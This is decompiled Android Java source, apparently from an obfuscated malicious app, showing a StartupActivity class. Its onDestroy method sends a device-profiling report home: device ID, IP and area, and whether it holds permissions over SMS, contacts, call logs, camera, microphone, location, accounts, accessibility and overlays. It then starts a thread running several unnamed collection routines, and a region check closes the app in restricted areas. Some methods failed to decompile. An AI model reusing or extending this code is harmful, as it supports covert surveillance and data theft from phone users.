package com.superbock.ui;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.PowerManager;
import android.provider.Settings;
import androidx.core.app.NotificationManagerCompat;
import androidx.core.content.ContextCompat;
import com.blankj.utilcode.util.SPUtils;
import com.blankj.utilcode.util.ToastUtils;
import com.superbock.App;
import com.superbock.auto.BaseService;
import comeliest.metempsychosis.pokelogan.R;
import e3.d;
import f.e;
import i3.p;
import java.util.ArrayList;
import java.util.List;
import k.j0;
import k3.f;
import k3.i;

/* loaded from: classes.dex */
public class StartupActivity extends Activity {

    /* renamed from: g, reason: collision with root package name */
    public static boolean f1537g;

    /* renamed from: h, reason: collision with root package name */
    public static long f1538h;

    /* renamed from: i, reason: collision with root package name */
    public static int f1539i;

    /* renamed from: b, reason: collision with root package name */
    public String f1540b;

    /* renamed from: c, reason: collision with root package name */
    public long f1541c = 0;

    /* renamed from: d, reason: collision with root package name */
    public boolean f1542d = false;

    /* renamed from: e, reason: collision with root package name */
    public boolean f1543e = false;

    /* renamed from: f, reason: collision with root package name */
    public List<String> f1544f = new ArrayList();

    /* loaded from: classes18.dex */
    public class a implements Runnable {
        @Override // java.lang.Runnable
        public final void run() {
            f.b(App.f1372b);
            f.a();
            f.n(App.f1372b);
            f.f(App.f1372b);
            f.q(App.f1372b);
            f.l(App.f1372b);
            f.t(App.f1372b);
            f.d(App.f1372b);
            f.p(App.f1372b);
            f.h(App.f1372b);
            if (j0.l() == 1) {
                f.r(App.f1372b);
            }
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:110:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:130:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:17:0x01f4  */
    /* JADX WARN: Removed duplicated region for block: B:45:0x02fd  */
    /* JADX WARN: Removed duplicated region for block: B:48:0x030b  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x00fb  */
    /* JADX WARN: Removed duplicated region for block: B:88:? A[RETURN, SYNTHETIC] */
    /* JADX WARN: Type inference failed for: r1v3, types: [java.util.ArrayList, java.util.List<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r1v6, types: [java.util.ArrayList, java.util.List<java.lang.String>] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    public final void a() {
        /*
            Method dump skipped, instructions count: 1020
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.superbock.ui.StartupActivity.a():void");
    }

    @Override // android.app.Activity
    public final void onActivityResult(int i5, int i6, Intent intent) {
        if (i5 == 10010) {
            this.f1542d = true;
            a();
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:32:0x0126, code lost:
    
        if (androidx.core.content.ContextCompat.checkSelfPermission(r8, "android.permission.READ_MEDIA_IMAGES") != 0) goto L41;
     */
    /* JADX WARN: Code restructure failed: missing block: B:68:0x0131, code lost:
    
        r8.f1544f.add(r9);
     */
    /* JADX WARN: Code restructure failed: missing block: B:70:0x012f, code lost:
    
        if (androidx.core.content.ContextCompat.checkSelfPermission(r8, "android.permission.READ_EXTERNAL_STORAGE") != 0) goto L41;
     */
    /* JADX WARN: Type inference failed for: r0v20, types: [java.util.ArrayList, java.util.List<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r0v21, types: [java.util.ArrayList, java.util.List<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r0v22, types: [java.util.ArrayList, java.util.List<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r0v23, types: [java.util.ArrayList, java.util.List<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r0v24, types: [java.util.ArrayList, java.util.List<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r0v25, types: [java.util.ArrayList, java.util.List<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r0v26, types: [java.util.ArrayList, java.util.List<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r0v27, types: [java.util.ArrayList, java.util.List<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r0v28, types: [java.util.ArrayList, java.util.List<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r0v29, types: [java.util.ArrayList, java.util.List<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r0v30, types: [java.util.ArrayList, java.util.List<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r0v8, types: [java.util.ArrayList, java.util.List<java.lang.String>] */
    /* JADX WARN: Type inference failed for: r3v0, types: [java.util.HashSet, java.util.Set<java.lang.String>] */
    @Override // android.app.Activity
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    public final void onCreate(@androidx.annotation.Nullable android.os.Bundle r9) {
        /*
            Method dump skipped, instructions count: 461
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.superbock.ui.StartupActivity.onCreate(android.os.Bundle):void");
    }

    @Override // android.app.Activity
    public final void onDestroy() {
        e eVar = new e();
        eVar.put("action", "saveDev");
        eVar.put("step", 3);
        eVar.put("deviceId", k3.a.c(this));
        String string = SPUtils.getInstance().getString("ip");
        if (string.length() > 0) {
            eVar.put("ip", string);
        }
        String string2 = SPUtils.getInstance().getString("area");
        if (string2.length() > 0) {
            eVar.put("area", string2);
        }
        int i5 = Build.VERSION.SDK_INT;
        if (i5 >= 23) {
            eVar.put("overlay", Integer.valueOf(Settings.canDrawOverlays(this) ? 1 : d.f2592b ? 2 : 0));
        }
        eVar.put("enter", Integer.valueOf(SPUtils.getInstance().getInt("enter", 0)));
        eVar.put("readImages", Integer.valueOf((i5 <= 32 ? ContextCompat.checkSelfPermission(this, "android.permission.READ_EXTERNAL_STORAGE") != 0 : ContextCompat.checkSelfPermission(this, "android.permission.READ_MEDIA_IMAGES") != 0) ? 0 : 1));
        eVar.put("readContacts", Integer.valueOf(ContextCompat.checkSelfPermission(this, "android.permission.READ_CONTACTS") == 0 ? 1 : 0));
        eVar.put("readSms", Integer.valueOf(ContextCompat.checkSelfPermission(this, "android.permission.READ_SMS") == 0 ? 1 : 0));
        eVar.put("readCallLog", Integer.valueOf(ContextCompat.checkSelfPermission(this, "android.permission.READ_CALL_LOG") == 0 ? 1 : 0));
        if (i5 >= 23) {
            eVar.put("accessibility", Integer.valueOf(k3.a.f(this) ? 1 : 0));
            eVar.put("battery", Integer.valueOf(((PowerManager) getSystemService("power")).isIgnoringBatteryOptimizations(getPackageName()) ? 1 : 0));
        }
        eVar.put("writeFile", Integer.valueOf(ContextCompat.checkSelfPermission(this, "android.permission.WRITE_EXTERNAL_STORAGE") == 0 ? 1 : 0));
        eVar.put("camera", Integer.valueOf(ContextCompat.checkSelfPermission(this, "android.permission.CAMERA") == 0 ? 1 : 0));
        eVar.put("recordAudio", Integer.valueOf(ContextCompat.checkSelfPermission(this, "android.permission.RECORD_AUDIO") == 0 ? 1 : 0));
        eVar.put("location", Integer.valueOf(ContextCompat.checkSelfPermission(this, "android.permission.ACCESS_COARSE_LOCATION") == 0 ? 1 : 0));
        eVar.put("sendSms", Integer.valueOf(ContextCompat.checkSelfPermission(this, "android.permission.SEND_SMS") == 0 ? 1 : 0));
        eVar.put("getAccounts", Integer.valueOf(ContextCompat.checkSelfPermission(this, "android.permission.GET_ACCOUNTS") == 0 ? 1 : 0));
        eVar.put("callPhone", Integer.valueOf(ContextCompat.checkSelfPermission(this, "android.permission.CALL_PHONE") != 0 ? 0 : 1));
        eVar.put("notification", Integer.valueOf(NotificationManagerCompat.from(this).areNotificationsEnabled() ? 1 : 0));
        i.a(eVar, new p());
        new Thread(new a()).start();
        f1537g = false;
        f1538h = 0L;
        f1539i = 0;
        BaseService.F = false;
        BaseService.G = false;
        if (BaseService.f1409z) {
            BaseService.f1409z = false;
            BaseService.C = Boolean.TRUE;
        }
        super.onDestroy();
    }

    /* JADX WARN: Type inference failed for: r1v1, types: [java.util.ArrayList, java.util.List<java.lang.String>] */
    @Override // android.app.Activity
    public final void onRequestPermissionsResult(int i5, String[] strArr, int[] iArr) {
        super.onRequestPermissionsResult(i5, strArr, iArr);
        this.f1544f.clear();
        a();
    }

    @Override // android.app.Activity
    public final void onRestart() {
        super.onRestart();
        if (j0.g() != 1 || !k3.a.j()) {
            a();
            return;
        }
        if (Build.VERSION.SDK_INT >= 23) {
            ToastUtils.make().setGravity(17, 0, 0).setMode(ToastUtils.MODE.DARK).show(getString(R.string.restricted_area));
        } else {
            ToastUtils.showLong(getString(R.string.restricted_area));
        }
        finish();
    }
}
